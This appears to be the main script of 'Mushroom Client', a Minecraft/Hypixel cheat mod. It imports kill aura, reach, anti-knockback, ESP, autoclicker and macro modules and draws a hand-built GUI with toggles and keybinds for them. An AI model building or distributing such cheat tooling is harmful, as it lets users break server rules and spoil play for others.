/// <reference lib="es2015" />

import request from "request/index"
import Config from "./Config/Config"
import Discord from "./Code/Other//Discord"

import "./Code/Combat/AntiKnockback"
import "./Code/Combat/Autoblock"
import "./Code/Combat/Clickmultiplier"
import "./Code/Combat/Killaura"
import "./Code/Combat/NoWalls"
import "./Code/Combat/Reach"

import "./Code/Visual/Esp"
import "./Code/Visual/Ranks"
import "./Code/Visual/FakeBan"
import "./Code/Visual/ChestESP"
import "./Code/Visual/SkullESP"

import "./Code/Macros/Autoclicker"
import "./Code/Macros/ChestAura"
import "./Code/Macros/LeverAura"
import "./Code/Macros/Scaffold"
import "./Code/Macros/SkullAura"
import "./Code/Macros/Swordswap"
import "./Code/Macros/ZombiesMacro"

import "./Code/ChatMacros/Autoptransfer"
import "./Code/ChatMacros/ChatMacros"
import "./Code/ChatMacros/Emotes"
import "./Code/ChatMacros/GuildBridge"
import "./Code/ChatMacros/MathsBot"
import "./Code/ChatMacros/RandomCommands"

import "./Code/Skyblock/AuctionSnipe"
import "./Code/Skyblock/Autoterms"
import "./Code/Skyblock/Bonzomask"
import "./Code/Skyblock/DungeonScore"
import "./Code/Skyblock/DungeonScoreMessage"
import "./Code/Skyblock/Dungeonshitter"
import "./Code/Skyblock/GhostBlocks"
import "./Code/Skyblock/GyroTimer"
import "./Code/Skyblock/MelodyMacro"

import "./Code/Other/BANKEY"
import "./Code/Other/ChatCopy"
import "./Code/Other/Clip"
import "./Code/Other/FREEZE"
import "./Code/Other/Hilarity"
import "./Code/Other/ImagePaste"
import "./Code/Other/UpdateChecker"

import {prefix, getVersion, RightClick} from "./Code/Utils"
var text = new Text(prefix, 55, 17.5);
var text2 = new Text(prefix, 5, 17.5);

// DONT MIND ANY OF THIS CODE ITS SO BAD IK

register("command", () => { // why different commands...?
Config.openGUI()
}).setName("mco")
register("command", () => {
Config.openGUI()
}).setName("mushroomclient");
register("command", () => {
  Config.openGUI()
  }).setName("mushroom");
register("command", () => {
Config.openGUI()
}).setName("mush");

// multiple strings go hard
ChatLib.chat(ChatLib.getChatBreak("&9-"));
ChatLib.chat(ChatLib.getCenteredText(`&b&l&nMushroom Client v${getVersion()}`));
ChatLib.chat(ChatLib.getCenteredText(""));
ChatLib.chat(ChatLib.getCenteredText("&a&lThank you for installing §c§lM§f§lu§c§ls§f§lh§c§lr§f§lo§c§lo§f§lo§c§lm §lClient!")); // mushroom client couldve been typed with ${prefix}
ChatLib.chat(ChatLib.getCenteredText("&2&lTo Access the gui run &c&l/mc!"));
ChatLib.chat(ChatLib.getCenteredText("&e&lTo see the old gui run &4&l/mco"));
ChatLib.chat(ChatLib.getCenteredText("&6&lTo check commands do /mhelp"));
ChatLib.chat(ChatLib.getCenteredText("")); // awesome text man
ChatLib.chat(ChatLib.getChatBreak("&9-"));

register("renderOverlay", Mushroomclientlogo);

const logo = new Image("Mushroom_Client.png", "https://imgur.com/EVwWOG6.png");

function Mushroomclientlogo() {
  if (!Config.showmushroomlogo) return;
logo.draw(0, 0);
}

register("renderWorld", mushroomshado);

const mushroomshadowimg = new Image("footsteps.png", "https://imgur.com/cJPhnHq.png");

function mushroomshado(partialTicks) {
const lastX = new Entity(Player.getPlayer()).getLastX(); // LITTERALLY THE CODE FROM THE CHATTRIGGERS WEBSITE
const lastY = new Entity(Player.getPlayer()).getLastY();
const lastZ = new Entity(Player.getPlayer()).getLastZ();
const currentX = Player.getX();
const currentY = Player.getY();
const currentZ = Player.getZ();
    if (!Config.mushroomshadow) return; 
    Tessellator.bindTexture(mushroomshadowimg);
    Tessellator.begin()
      .translate(
        lastX + (currentX - lastX) * partialTicks,
        lastY + (currentY - lastY) * partialTicks-0.49,
        lastZ + (currentZ - lastZ) * partialTicks-0.3
      )
      .pos(-0.5, 0.5, -0.5).tex(0, 0)
      .pos(-0.5, 0.5, 0.5).tex(0, 1)
      .pos(0.5, 0.5, 0.5).tex(1, 1)
      .pos(0.5, 0.5, -0.5).tex(1, 0)
      .draw();
  }

// each letter rendered in seperate variables :skull:
// prob why my fps dies


register("renderOverlay", rainbowMushroomclienttextwithlogo);
var exampleImportStep = 1;
function rainbowMushroomclienttextwithlogo() {
  if (!Config.showmushroomlogo || !Config.Mushroomrainbow || !Config.showmushroomtext) return;
  if (configGui.isOpen()) return;
var letter1withlogo = new Text("&l[", 55, 17.5).setColor(Renderer.getRainbow(exampleImportStep -75,100)); // each letter is a different variable lmao 
var letter2withlogo = new Text("&lM", 60, 17.5).setColor(Renderer.getRainbow(exampleImportStep -100,100)); 
var letter3withlogo = new Text("&lu", 67, 17.5).setColor(Renderer.getRainbow(exampleImportStep -125,100));
var letter4withlogo = new Text("&ls", 74, 17.5).setColor(Renderer.getRainbow(exampleImportStep -150,100));
var letter5withlogo = new Text("&lh", 81, 17.5).setColor(Renderer.getRainbow(exampleImportStep -175,100));
var letter6withlogo = new Text("&lr", 88, 17.5).setColor(Renderer.getRainbow(exampleImportStep -200,100));
var letter7withlogo = new Text("&lo", 95, 17.5).setColor(Renderer.getRainbow(exampleImportStep -225,100));
var letter8withlogo = new Text("&lo", 102, 17.5).setColor(Renderer.getRainbow(exampleImportStep -250,100));
var letter9withlogo = new Text("&lo", 109, 17.5).setColor(Renderer.getRainbow(exampleImportStep -275,100));
var letter10withlogo = new Text("&lm", 116, 17.5).setColor(Renderer.getRainbow(exampleImportStep -300,100));
var letter11withlogo = new Text("&lC", 126, 17.5).setColor(Renderer.getRainbow(exampleImportStep -350,100));
var letter12withlogo = new Text("&ll", 133, 17.5).setColor(Renderer.getRainbow(exampleImportStep -375,100));
var letter13withlogo = new Text("&li", 137, 17.5).setColor(Renderer.getRainbow(exampleImportStep -400,100));
var letter14withlogo = new Text("&le", 140, 17.5).setColor(Renderer.getRainbow(exampleImportStep -425,100));
var letter15withlogo = new Text("&ln", 147, 17.5).setColor(Renderer.getRainbow(exampleImportStep -450,100));
var letter16withlogo = new Text("&lt", 154, 17.5).setColor(Renderer.getRainbow(exampleImportStep -475,100));
var letter17withlogo = new Text("&l]", 159, 17.5).setColor(Renderer.getRainbow(exampleImportStep -500,100));
var mcversionlogo = new Text(`&lv2.0`, 55, 29).setColor(Renderer.getRainbow(exampleImportStep -75,100));
exampleImportStep++;
  letter1withlogo.draw();
  letter2withlogo.draw();
  letter3withlogo.draw();
  letter4withlogo.draw();
  letter5withlogo.draw();
  letter6withlogo.draw();
  letter7withlogo.draw();
  letter8withlogo.draw();
  letter9withlogo.draw();
  letter10withlogo.draw();
  letter11withlogo.draw();
  letter12withlogo.draw();
  letter13withlogo.draw();
  letter14withlogo.draw();
  letter15withlogo.draw();
  letter16withlogo.draw();
  letter17withlogo.draw();
  mcversionlogo.draw();
}

register("renderOverlay", Mushroomclienttext);
function Mushroomclienttext() {
  if (!Config.showmushroomtext || !Config.showmushroomlogo || Config.Mushroomrainbow) return;
  text.draw();
}

register("renderOverlay", Mushroomclienttext2);
function Mushroomclienttext2() {
  if (!Config.showmushroomtext || Config.showmushroomlogo || Config.Mushroomrainbow) return;
  text2.draw();
}


register("renderOverlay", rainbowMushroomclienttext);
var exampleImportStep = 1;
function rainbowMushroomclienttext() {
  if (!Config.Mushroomrainbow || !Config.showmushroomtext || Config.showmushroomlogo) return;
  if (configGui.isOpen()) return;
var letter1 = new Text("&l[", 5, 17.5).setColor(Renderer.getRainbow(exampleImportStep -75,100));
var letter2 = new Text("&lM", 10, 17.5).setColor(Renderer.getRainbow(exampleImportStep -100,100));
var letter3 = new Text("&lu", 17, 17.5).setColor(Renderer.getRainbow(exampleImportStep -125,100));
var letter4 = new Text("&ls", 24, 17.5).setColor(Renderer.getRainbow(exampleImportStep -150,100));
var letter5 = new Text("&lh", 31, 17.5).setColor(Renderer.getRainbow(exampleImportStep -175,100));
var letter6 = new Text("&lr", 38, 17.5).setColor(Renderer.getRainbow(exampleImportStep -200,100));
var letter7 = new Text("&lo", 45, 17.5).setColor(Renderer.getRainbow(exampleImportStep -225,100));
var letter8 = new Text("&lo", 52, 17.5).setColor(Renderer.getRainbow(exampleImportStep -250,100));
var letter9 = new Text("&lo", 59, 17.5).setColor(Renderer.getRainbow(exampleImportStep -275,100));
var letter10 = new Text("&lm", 66, 17.5).setColor(Renderer.getRainbow(exampleImportStep -300,100));
var letter11 = new Text("&lC", 76, 17.5).setColor(Renderer.getRainbow(exampleImportStep -350,100));
var letter12 = new Text("&ll", 83, 17.5).setColor(Renderer.getRainbow(exampleImportStep -375,100));
var letter13 = new Text("&li", 87, 17.5).setColor(Renderer.getRainbow(exampleImportStep -400,100));
var letter14 = new Text("&le", 90, 17.5).setColor(Renderer.getRainbow(exampleImportStep -425,100));
var letter15 = new Text("&ln", 97, 17.5).setColor(Renderer.getRainbow(exampleImportStep -450,100));
var letter16 = new Text("&lt", 104, 17.5).setColor(Renderer.getRainbow(exampleImportStep -475,100));
var letter17 = new Text("&l]", 109, 17.5).setColor(Renderer.getRainbow(exampleImportStep -500,100));
var mcversion = new Text(`&lv2.0`, 5, 29).setColor(Renderer.getRainbow(exampleImportStep -75,100));
  exampleImportStep++;
letter1.draw();
letter2.draw();
letter3.draw();
letter3.draw();
letter4.draw();
letter5.draw();
letter6.draw();
letter7.draw();
letter8.draw();
letter9.draw();
letter10.draw();
letter11.draw();
letter12.draw();
letter13.draw();
letter14.draw();
letter15.draw();
letter16.draw();
letter17.draw();
mcversion.draw();
}

// omg small bit of code wtf!?!?!?

register("renderPlayerList", () => {
  if (!Config.mushroomclientontop) return;
    TabList.setHeader("§c§lM§f§lu§c§ls§f§lh§c§lr§f§lo§c§lo§f§lo§c§lm §lClient on top!\n");
  }
);

// ---------------------------------------------------------
const backgroundfunny = new Image("MushroomBackground.png", "https://imgur.com/yNqJf5D.png");

let configGui = new Gui();

let slidernumberka = 0
let slidernumber = 0
let funslider = 0
let funslider2 = 0
/*
register("step", () => {
  Config.buttonheightcon = 20
  Config.buttonwidthcon = 100    // here for when i fuck up gui
})
*/
class buttondraw {
    constructor(x, y, width, height, text) {
        this.x = x;
        this.y = y;
        this.width = width;
        this.height = height;
        this.text = text;
    }
    clickedbutton() {
      let buttontext = this.text;
      let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 2);
      let buttony = this.y + (this.height / 2 - 4);
      Renderer.drawRect(Renderer.color(20, 150, 100, 250), this.x, this.y, this.width, this.height);
      Renderer.drawString(buttontext, buttonx, buttony);
  }
  titlebutton() {
    let buttontext = this.text;
    let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 2);
    let buttony = this.y + (this.height / 2 - 4);
      Renderer.drawRect(Renderer.color(0, 0, 250, 250), this.x, this.y, this.width, this.height);
    Renderer.drawString(buttontext, buttonx, buttony);
}

    drawButton() {
        let buttontext = this.text;
        let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 2);
        let buttony = this.y + (this.height / 2 - 4);
        let mx = Client.getMouseX();
        let my = Client.getMouseY();
        if (mx >= this.x && mx <= this.x + this.width && my >= this.y && my <= this.y + this.height) {
            Renderer.drawRect(Renderer.color(20, 150, 100, 150), this.x, this.y, this.width, this.height);
        } else {
            Renderer.drawRect(Renderer.color(50, 50, 50, 250), this.x, this.y, this.width, this.height);
        }
        Renderer.drawString(buttontext, buttonx, buttony);
    }

    extrabutton() {
      let buttontext = this.text;
      let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 1.5);
      let buttony = this.y + (this.height / 2 - 4);
      let mx = Client.getMouseX(); 
      let my = Client.getMouseY();
      Renderer.drawRect(Renderer.color(25, 25, 25, 250), this.x, this.y, this.width, this.height);
      Renderer.drawRect(Renderer.color(250, 250, 250, 250), this.x + (Config.buttonwidthcon * 0.851), this.y + (Config.buttonheightcon / 2.009), this.width / (Config.buttonwidthcon / 8.5), this.height / (Config.buttonheightcon / 8));
      if (mx >= this.x && mx <= this.x + this.width && my >= this.y && my <= this.y + this.height) {
        Renderer.drawRect(Renderer.color(0, 0, 250, 150), this.x + (Config.buttonwidthcon * 0.855), this.y + (Config.buttonheightcon / 2), this.width / (Config.buttonwidthcon / 7.407), this.height / (Config.buttonheightcon / 7.4074));
      }
      Renderer.drawString(buttontext, buttonx, buttony);
  }
  extrabuttontoggled() {
    let buttontext = this.text;
    let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 1.5);
    let buttony = this.y + (this.height / 2 - 4);
    Renderer.drawRect(Renderer.color(0, 0, 250, 250), this.x + (Config.buttonwidthcon * 0.855), this.y + (Config.buttonheightcon / 2), this.width / (Config.buttonwidthcon / 7.407), this.height / (Config.buttonheightcon / 7.4074));
    Renderer.drawString(buttontext, buttonx, buttony);
}
sliderdraw() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) * 1.5);
  let buttony = this.y + (this.height / 2 - 4);
  let mx = Client.getMouseX();
  Renderer.drawRect(Renderer.color(25, 25, 25, 250), this.x, this.y, this.width, this.height);
  Renderer.drawRect(Renderer.color(25, 250, 200, 200), this.x, this.y, funslider, this.height - 1);
  Renderer.drawString(buttontext, buttonx, buttony);
}
slidertoggleddraw() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) * 1.5);
  let buttony = this.y + (this.height / 2 - 4);
  let mx = Client.getMouseX();
  Config.buttonheightcon = ((mx - this.x).toFixed(1) / 2)
  if (Config.buttonheightcon <= 11) {
    Config.buttonheightcon = 10
  }
  if (Config.buttonheightcon >= Config.buttonwidthcon / 2) {
    Config.buttonheightcon = Config.buttonwidthcon / 2
  }
  funslider = (Config.buttonheightcon) * 2
  Renderer.drawRect(Renderer.color(25, 25, 25, 250), this.x, this.y, this.width, this.height);
  Renderer.drawRect(Renderer.color(25, 250, 200, 200), this.x, this.y, funslider, this.height - 1);
  Renderer.drawString(buttontext, buttonx, buttony);
}
typeherebox() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 2);
  let buttony = this.y + (this.height / 2 - 4);
  Renderer.drawRect(Renderer.color(25,25,25, 250), this.x, this.y, this.width, this.height);
  Renderer.drawString(buttontext, buttonx, buttony);
}
sliderdrawwidth() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) * 1.5);
  let buttony = this.y + (this.height / 2 - 4);
  let mx = Client.getMouseX();
  Renderer.drawRect(Renderer.color(25, 25, 25, 250), this.x, this.y, this.width, this.height);
  Renderer.drawRect(Renderer.color(25, 250, 200, 200), this.x, this.y, funslider2, this.height);
  Renderer.drawString(buttontext, buttonx, buttony);
}
slidertoggleddrawwidth() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) * 1.5);
  let buttony = this.y + (this.height / 2 - 4);
  let mx = Client.getMouseX();
  Config.buttonwidthcon = ((mx - this.x + 30))
  if (Config.buttonwidthcon <= 51) {
    Config.buttonwidthcon = 50
  }
  if (Config.buttonwidthcon >= 150) {
    Config.buttonwidthcon = 150
  }
  funslider2 = Config.buttonwidthcon
  Renderer.drawRect(Renderer.color(25, 25, 25, 250), this.x, this.y, this.width, this.height);
  Renderer.drawRect(Renderer.color(25, 250, 200, 200), this.x, this.y, funslider2, this.height);
  Renderer.drawString(buttontext, buttonx, buttony);
}
typeherebox() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 2);
  let buttony = this.y + (this.height / 2 - 4);
  Renderer.drawRect(Renderer.color(25,25,25, 250), this.x, this.y, this.width, this.height);
  Renderer.drawString(buttontext, buttonx, buttony);
}
selectbutton() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) * 2);
  let buttony = this.y + (this.height / 2 - 4);
  Renderer.drawRect(Renderer.color(25,25,25, 250), this.x, this.y, this.width, this.height / 2);
  Renderer.drawString("Mode", this.x + 5, this.y + (Config.buttonheightcon * 0.2))
  Renderer.drawString(buttontext, buttonx, buttony);
}
keybindbutton() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 2);
  let buttony = this.y + (this.height / 2 - 4);
  Renderer.drawRect(Renderer.color(25, 25,25, 250), this.x, this.y, this.width, this.height);
  Renderer.drawString("Keybind", this.x + (Config.buttonwidthcon * 0.05), this.y + 1)
  Renderer.drawString("[  ]", this.x + (Config.buttonwidthcon * 0.85), this.y + 1)
  Renderer.drawString(buttontext, buttonx, buttony);
}
commingsoontm() {
  let buttontext = this.text;
  let buttonx = this.x + (this.width / 2 - Renderer.getStringWidth(this.text) / 2);
  let buttony = this.y + (this.height / 2 - 4);
    Renderer.drawRect(Renderer.color(2, 2, 2, 250), this.x, this.y, this.width, this.height);
  Renderer.drawString(buttontext, buttonx, buttony);
}
    isMouseOver() {
        let mx = Client.getMouseX();
        let my = Client.getMouseY();
        if (mx >= this.x && mx <= this.x + this.width && my >= this.y && my <= this.y + this.height) {
            return true;
        }
    }
}

register("command", function() {
    configGui.open();
}).setName("mc");

register("renderOverlay", function() {
    if (configGui.isOpen()) {
        let mushroomer = new Text("Mushroom Client", Renderer.screen.getWidth() / 2 - 90 - Renderer.getStringWidth(mushroomer) * 1.1, Renderer.screen.getHeight() / 1.2).setColor(Renderer.getRainbow(exampleImportStep)).setScale(7).setShadow(true);
        mushroomer.draw();
    }
})  

function killauratextpog(typedChar, keyCode) {
  if (keyCode == 29 || keyCode == 42 || keyCode == 58 || keyCode == 15 || keyCode == 28 || keyCode == 1) return;
  if (keyCode == 14) {
    textpog = textpog.replace(textpog.charAt((textpog.length - 1)), "")
    return;
  }
  (textpog = textpog + typedChar)
  return;
}
function killaurakeybindpog(typedChar, keyCode) {
  if (keyCode == 14) return;
  killaurakeybinded = typedChar
  Config.killaurakeybindconfig = keyCode
  if (keyCode == 42) {
    Config.killaurakeybindconfig = ""
  }
  killaurakeybindnow = false
  return;
}
function nowallkeybindpog(typedChar, keyCode) {
  if (keyCode == 14) return;
  nowallkeybinded = typedChar
  Config.nowallkeybindconfig = keyCode
  if (keyCode == 42) {
    Config.nowallkeybindconfig = ""
  }
  nowallbindnow = false
  return;
}
function autoblockkeybindpog(typedChar, keyCode) {
  if (keyCode == 14) return;
  autoblockbinded = typedChar
  Config.autoblockkeybindconfig = keyCode
  if (keyCode == 42) {
    Config.autoblockkeybindconfig = ""
  }
  autoblockbindnow = false
  return;
}
function cpsmultiplierkeybindpog(typedChar, keyCode) {
  if (keyCode == 14) return;
  cpsmultiplierbinded = typedChar
  Config.cpsmultikeybindconfig = keyCode
  if (keyCode == 42) {
    Config.cpsmultikeybindconfig = ""
  }
  cpsmultiplierbindnow = false
  return;
}
function freezekeybindpog(typedChar, keyCode) {
  if (keyCode == 14) return;
  freezebinded = typedChar
  Config.freezekeybindconfig = keyCode
  if (keyCode == 42) {
    Config.freezekeybindconfig = ""
  }
  freezebindnow = false
  return;
}
function cancel() {
return;
}

let combatxnew = 52
let combatynew = 2
let visualxnew = 202
let visualynew = 2
let macroxnew = 352
let macroynew = 2
let cmacroxnew = 502
let cmacroynew = 2
let skyblockxnew = 652
let skyblockynew = 2
let otherxnew = 802
let otherynew = 2

register("step", () => {
if (clickguimode == 1) {
combatxnew = 52
combatynew = 2
visualxnew = 202
visualynew = 2
macroxnew = 352
macroynew = 2
cmacroxnew = 502
cmacroynew = 2
skyblockxnew = 652
skyblockynew = 2
otherxnew = 802
otherynew = 2
}
if (clickguimode == 2) {
combatxnew = 2
 combatynew = 2
 visualxnew = 202
 visualynew = 2
 macroxnew = 352
 macroynew = 2
 cmacroxnew = 502
 cmacroynew = 2
 skyblockxnew = 652
 skyblockynew = 2
 otherxnew = 802
 otherynew = 2
}
})
register("step", () => {
  if (letmovecombatgui) {
    combatxnew = Config.combatxpog = Client.getMouseX() - Config.buttonwidthcon / 2
    combatynew = Config.combatypog = Client.getMouseY() - Config.buttonheightcon / 2
    combatxnew.toFixed(1)
    combatynew.toFixed(1)
  }
  if (letmovevisualgui) {
    visualxnew = Config.visualxpog = Client.getMouseX() - Config.buttonwidthcon / 2
    visualynew = Config.visualypog = Client.getMouseY() - Config.buttonheightcon / 2
    visualxnew.toFixed(1)
    visualynew.toFixed(1)
  }
  if (letmovemacrogui) {
    macroxnew = Config.macroxpog = Client.getMouseX() - Config.buttonwidthcon / 2
    macroynew = Config.macroxpog = Client.getMouseY() - Config.buttonheightcon / 2
    macroxnew.toFixed(1)
    macroynew.toFixed(1)
  }
  if (letmovecmacrogui) {
    cmacroxnew = Config.cmacroxpog = Client.getMouseX() - Config.buttonwidthcon / 2
    cmacroynew = Config.cmacroypog = Client.getMouseY() - Config.buttonheightcon / 2
    cmacroxnew.toFixed(1)
    cmacroynew.toFixed(1)
  }
  if (letmoveskyblockgui) {
    skyblockxnew = Config.skyblockxpog = Client.getMouseX() - Config.buttonwidthcon / 2
    skyblockynew = Config.skyblockypog = Client.getMouseY() - Config.buttonheightcon / 2
    skyblockxnew.toFixed(1)
    skyblockynew.toFixed(1)
  }
  if (letmoveothergui) {
    otherxnew = Config.otherxpog = Client.getMouseX() - Config.buttonwidthcon / 2
    otherynew = Config.otherypog = Client.getMouseY() - Config.buttonheightcon / 2
    otherxnew.toFixed(1)
    otherynew.toFixed(1)
  }
});

let textpog = ""
let killaurakeybinded = ""
let killaurakeypress = ""
let nowallkeybinded = ""
let nowallkeybind = ""
let autoblockbinded = ""
let autoblockkeybind = ""
let cpsmultiplierbinded = ""
let cpsmultiplierkeybind = ""
let freezebinded = ""
let freezekeybind = ""
register("step", () => {
combatx = (combatxnew)
combattitley = (combatynew)
killauray = (combattitley + Config.buttonheightcon)
//
killaurarangenumy = (killauray + Config.buttonheightcon + (Config.buttonheightcon /10))
killaurarangenumx = (combatx + (Config.buttonwidthcon * 0.8))
//
if (killauraextra) {
killauraextray = (killauray + Config.buttonheightcon)
//killaurarangey = (killauray + 20)
killauramobsy = (killauray + (Config.buttonheightcon * 2))
killauraaby = (killauray + (Config.buttonheightcon * 3))
killaurakeybindy = (killauray + (Config.buttonheightcon * 4))
}
if (!killauraextra) {
killauraextray = killauray
killaurarangey = killauray
killauramobsy = killauray
killauraaby = killauray
killaurakeybindy = killauray
}
// 
nowally = (killaurakeybindy + Config.buttonheightcon)
if (nowallextra) {
nowallextray = (nowally + Config.buttonheightcon)
nowallkeybindy = (nowally + (Config.buttonheightcon * 2))
}
if (!nowallextra) {
nowallextray = nowally
nowallkeybindy = nowally
}
//
autoblocky = (nowallkeybindy + Config.buttonheightcon)
if (autoblockextra) {
autoblockextray = (autoblocky + Config.buttonheightcon)
autoblockkeybindy = (autoblocky + (Config.buttonheightcon * 2))
}
if (!autoblockextra) {
autoblockextray = autoblocky
autoblockkeybindy = autoblocky
}
//
cpsmultipliery = (autoblockkeybindy + Config.buttonheightcon)
if (cpsmultiplierextra) {
  cpsmultiplierextra1y = (cpsmultipliery + Config.buttonheightcon)
  cpsmultiplierextra2y = (cpsmultipliery + (Config.buttonheightcon * 2))
  cpsmultiplierkeybindy = (cpsmultipliery + (Config.buttonheightcon * 3))
  }
  if (!cpsmultiplierextra) {
  cpsmultiplierextra1y = cpsmultipliery
  cpsmultiplierextra2y = cpsmultipliery
  cpsmultiplierkeybindy = cpsmultipliery
  }
//
antikby = (cpsmultiplierkeybindy + Config.buttonheightcon)
reachy = (antikby + Config.buttonheightcon)
/*
if (selectboxnum <= 0) {
  selectboxnum = 3
}
if (selectboxnum >= 4) {
  selectboxnum = 1
}
*/

// VISUAL
visualx = (visualxnew)
visualy = (visualynew)
clickguiy = (visualy + Config.buttonheightcon)
if (extraclickgui) {
clickguiheighty = (clickguiy + Config.buttonheightcon)
clickguiwidthy = (clickguiy + (Config.buttonheightcon * 2))
clickguiselecty = (clickguiy + (Config.buttonheightcon * 3))
}
if (!extraclickgui) {
  clickguiselecty = clickguiy
}
if (clickguimode <= 0) {
  clickguimode = 2
}
if (clickguimode >= 3) {
  clickguimode = 1
}
playerespy = (clickguiselecty + Config.buttonheightcon)
blockespy = (playerespy + Config.buttonheightcon)
nickhidery = (blockespy + Config.buttonheightcon)
fakebany = (nickhidery + Config.buttonheightcon)

// MACRO
macrox = (macroxnew)
macroy = (macroynew)
scaffoldy = (macroy + Config.buttonheightcon)
chestauray = (scaffoldy + Config.buttonheightcon)
skullauray = (chestauray + Config.buttonheightcon)
leverauray = (skullauray + Config.buttonheightcon)
swordswapy = (leverauray + Config.buttonheightcon)

// CHAT MACRO
cmacrox = (cmacroxnew)
cmacroy = (cmacroynew)
guildwelcy = (cmacroy + Config.buttonheightcon)
guildboty = (guildwelcy + Config.buttonheightcon)
quickmathsolvery = (guildboty + Config.buttonheightcon)
quotesy = (quickmathsolvery + Config.buttonheightcon)
autoptransfery = (quotesy + Config.buttonheightcon)

// SKYBLOCK
skyblockx = (skyblockxnew)
skyblocky = (skyblockynew)
autotermy = (skyblocky + Config.buttonheightcon)
dungeonscorecalcy = (autotermy + Config.buttonheightcon)
shitterwarningy = (dungeonscorecalcy + Config.buttonheightcon)
autoharpy = (shitterwarningy + Config.buttonheightcon)
ghostblocky = (autoharpy + Config.buttonheightcon)
gyrotimery = (ghostblocky + Config.buttonheightcon)
lguydiedy = (gyrotimery + Config.buttonheightcon)

// OTHER
otherx = (otherxnew)
othery = (otherynew)
hilarityy = (othery + Config.buttonheightcon)
spanishy = (hilarityy + Config.buttonheightcon)
discordrpcy = (spanishy + Config.buttonheightcon)
showupdatesy = (discordrpcy + Config.buttonheightcon)
freezey = (showupdatesy + Config.buttonheightcon)
freezeextrasy = (freezey + Config.buttonheightcon)

// ---------------------
if (killauratypeallow) {
  configGui.registerKeyTyped(killauratextpog);
}
if (killaurakeybindnow) {
  configGui.registerKeyTyped(killaurakeybindpog);
}
if (nowallbindnow) {
  configGui.registerKeyTyped(nowallkeybindpog);
}
if (autoblockbindnow) {
  configGui.registerKeyTyped(autoblockkeybindpog);
}
if (cpsmultiplierbindnow) {
  configGui.registerKeyTyped(cpsmultiplierkeybindpog);
}
if (freezebindnow) {
  configGui.registerKeyTyped(freezekeybindpog);
}
//
if (!killaurakeybindnow && !killauratypeallow && !nowallbindnow && !autoblockbindnow && !cpsmultiplierbindnow && !freezebindnow) {
configGui.registerKeyTyped(cancel)
}

//
titlepog = new buttondraw(combatx,combattitley - 10,100,10, "&cMUSHROOM CLIENT");
// COMBAT
combattitle = new buttondraw(combatx,combattitley,Config.buttonwidthcon,Config.buttonheightcon, "Combat");
killaura2 = new buttondraw(combatx,killauray, Config.buttonwidthcon, Config.buttonheightcon, "Kill Aura");
killauraextras = new buttondraw(combatx,killauraextray,Config.buttonwidthcon,Config.buttonheightcon, "through walls");
killauramobsbutton = new buttondraw(combatx,killauramobsy,Config.buttonwidthcon,Config.buttonheightcon, "mobs");
killauraautoblockbutton = new buttondraw(combatx,killauraaby,Config.buttonwidthcon,Config.buttonheightcon, "autoblock");
//killaurarange = new buttondraw(combatx,killaurarangey,100,10, "Range");
//killaurarangenumber = new Text(slidernumberka, killaurarangenumx, killaurarangenumy);
//killauratextbox = new buttondraw(combatx,killauratexty,100,10, textpog);
//killauraselectbox = new buttondraw(combatx,killauraselecty,100,10, "");
killaurakeybind = new buttondraw(combatx,killaurakeybindy,Config.buttonwidthcon,Config.buttonheightcon, "");
//newfunnytext = new Text("type here", combatx + 25, killauratexty + 1);
//selection1 = new Text("boosting", combatx + 52, killauraselecty + 1);
//selection2 = new Text("cheating", combatx + 52, killauraselecty + 1);
//selection3 = new Text("security", combatx + 52, killauraselecty + 1);
killaurakeybindtext = new Text(killaurakeybinded, combatx + (Config.buttonwidthcon * 0.89), killaurakeybindy + 1);
nowall = new buttondraw(combatx,nowally, Config.buttonwidthcon, Config.buttonheightcon, "No Walls");
nowallextras = new buttondraw(combatx,nowallextray,Config.buttonwidthcon,Config.buttonheightcon, "right clicks");
nowallkeybinddraw = new buttondraw(combatx,nowallkeybindy,Config.buttonwidthcon,Config.buttonheightcon, "");
nowallkeybindtext = new Text(nowallkeybinded, combatx + (Config.buttonwidthcon * 0.89), nowallkeybindy + 1);
autoblock2 = new buttondraw(combatx,autoblocky, Config.buttonwidthcon, Config.buttonheightcon, "Autoblock");
autoblockextras = new buttondraw(combatx,autoblockextray, Config.buttonwidthcon, Config.buttonheightcon, "always");
autoblockkeybinddraw = new buttondraw(combatx,autoblockkeybindy,Config.buttonwidthcon,Config.buttonheightcon, "");
autoblockkeybindtext = new Text(autoblockbinded, combatx + (Config.buttonwidthcon * 0.89), autoblockkeybindy + 1);
cpsmultiplier = new buttondraw(combatx,cpsmultipliery,Config.buttonwidthcon,Config.buttonheightcon, "CPS multiplier");
cpsmultiplierextra1 = new buttondraw(combatx,cpsmultiplierextra1y,Config.buttonwidthcon,Config.buttonheightcon, "right clicks");
cpsmultiplierextra2 = new buttondraw(combatx,cpsmultiplierextra2y,Config.buttonwidthcon,Config.buttonheightcon, "left clicks");
cpsmultiplierkeybinddraw = new buttondraw(combatx,cpsmultiplierkeybindy,Config.buttonwidthcon,Config.buttonheightcon, "");
cpsmultiplierkeybindtext = new Text(cpsmultiplierbinded, combatx + Config.buttonheightcon, cpsmultiplierkeybindy + 1);
reach = new buttondraw(combatx,reachy, Config.buttonwidthcon, Config.buttonheightcon, "Reach");
antiknockbackbox = new buttondraw(combatx,antikby, Config.buttonwidthcon, Config.buttonheightcon, "Anti Knockback");

// VISUAL
visualtitle = new buttondraw(visualx,visualy,Config.buttonwidthcon,Config.buttonheightcon, "Visual");
clickguibutton = new buttondraw(visualx,clickguiy, Config.buttonwidthcon, Config.buttonheightcon, "Click GUI");
